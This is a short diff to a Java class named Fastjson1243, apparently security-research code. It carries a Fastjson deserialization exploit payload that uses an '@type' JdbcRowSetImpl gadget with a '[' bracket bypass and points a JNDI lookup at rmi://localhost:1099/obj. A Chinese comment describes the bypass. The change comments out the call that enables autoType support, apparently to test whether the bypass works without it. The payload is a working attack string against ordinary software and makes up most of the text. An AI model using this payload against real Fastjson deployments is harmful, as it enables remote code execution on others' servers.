@@ -33,7 +33,7 @@ public class Fastjson1243 {
 
         //使用[进行绕过，与TemplatesImpl链子一样
         String payload2 = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[,{\"dataSourceName\":\"rmi://localhost:1099/obj\",\"autoCommit\": true}";
-        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
         JSON.parse(payload2);
     }
 }
